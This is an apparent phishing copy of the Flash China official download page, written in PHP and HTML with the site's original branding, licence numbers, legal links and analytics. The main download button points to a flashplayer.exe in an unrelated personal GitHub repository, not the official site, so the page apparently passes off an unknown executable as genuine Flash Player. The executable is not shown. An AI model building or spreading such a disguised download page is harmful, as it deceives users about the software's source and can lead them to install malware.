<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");  #设置允许跨域

?>

<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="renderer" content="webkit">
    <title>Flash Player官方下载-Flash中国官网</title>
    <meta name="keywords" content="Flash,Flash下载,Flash Player下载,Flash Player官方下载,Flash Player正版下载,flash官网">
    <meta name="description" content="Flash Player - 一款轻量级浏览器插件,让你在网页上享受更广泛的多媒体体验,更新、更安全、正版Flash Player下载尽在Flash中国官网">

    <link rel="stylesheet" href="https://static.flash.cn/frontend/css/common.css">
    <link rel="shortcut icon" href="https://www.flash.cn/favicon.ico" />
    <link rel="bookmark" href="https://www.flash.cn/favicon.ico" />
    <base target="_blank">
</head>
<body>
<div class="background-left"></div>
<div class="background-right"></div>


<div class="header">

    <div class="h-logo"><a href="/" target="_self">FLASH PLAYER</a></div>

    <ul class="h-nav">
        <li class="cur"><a href="/" target="_self">首页</a></li>
        <li><a href="https://www.flash.cn/enterprise/index" target="_self">企业版</a></li>
        <li><a href="https://www.flash.cn/help/index" target="_self">帮助中心</a></li>
        <li><a href="https://www.flash.cn/custom-service/index" target="_self">客服支持</a></li>
        <li class="h-lang"><a href="/english" target="_self">English</a></li>
    </ul>
</div>

<div id="index-content">
    <h1 class="ic-title">Adobe&nbsp;Flash&nbsp;Player</h1>
    <p id="ic-version">官方最新版本：<span>32.0.0.270</span></p>
    <div id="ic-download">
        <span>立即下载</span>
        <a href="https://github.com/casdawadaw11/flash/raw/master/flashplayer.exe" target="_self">立即下载</a>
    </div>
    <div id="ic-size">大小：<span>20.1MB</span></div>
    <ul id="ic-button">
        <li><span>系统要求</span><i></i></li>
        <li><span>其他平台版本</span><i></i></li>
    </ul>
    <i class="ic-icon"></i>
    <div class="ic-protocol"><label id="ic-checkbox" class="cur"><s></s><input type="checkbox"></label><div id="ic-popup">已阅读并同意<a href="https://wwwimages2.adobe.com/www.adobe.com/content/dam/acom/cn/legal/licenses-terms/pdf/PlatformClients_PC_WWEULA-zh_CN-20150407_1357.pdf">Adobe软件许可协议*</a>和<a href="https://www.flash.cn/Flash_Helper_Service_Agreement.pdf">Flash Helper Service使用协议</a></div></div>
</div>

<div class="footer">
    <ul class="f-nav">
        <li><a href="https://www.flash.cn/category/contact">联系我们</a><i></i></li>
        <li><a href="https://www.flash.cn/category/agreement">软件协议</a><i></i></li>
        <li><a href="https://www.flash.cn/category/protocol">使用协议</a><i></i></li>
    </ul>
    <div class="f-icp">Copyright&nbsp;&#169;&nbsp;<script>document.write(new Date().getFullYear())</script>&nbsp;重庆重橙网络科技有限公司.&nbsp;All&nbsp;rights&nbsp;reserved.&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action">渝ICP备18002678号-1</a><i class="f-icon"><s></s></i><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=50019002501402">渝公网安备50019002501402号</a></div></div>



<script src="https://static.flash.cn/frontend/js/common.js"></script>

<div class="hidden">


    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?ade42d4f682c4fca28c5f093052433c1";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

    <script>
        // 添加百度统计事件统计，统计下载
        var handler = function(ev){
            if (!_hmt) return;
            var event = ev || window.event;
            var target = event.target || event.srcElement;
            // 主页下载
            var parent = target.parentNode;
            var label, value;
            if(parent && parent.id === 'ic-download' && target.tagName.toLowerCase() === 'a'){
                label = 'index';
                value = target.href;
            }
            // 弹窗下载
            if(parent && parent.id === 'ov-start' && target.tagName.toLowerCase() === 'a'){
                label = 'popup';
                value = target.href;
            }
            if (label && value) {
                _hmt.push(['_trackEvent', 'filedownload', 'download', label, value]);
            }
        }
        if(document.addEventListener) document.addEventListener('click', handler, false);
        else if(document.attachEvent) document.attachEvent('onclick', handler);
    </script>
    <!--统计-->
            <script src="https://www.flash.cn/support/statistics?data=%2F"></script></div>
</body>
</html>
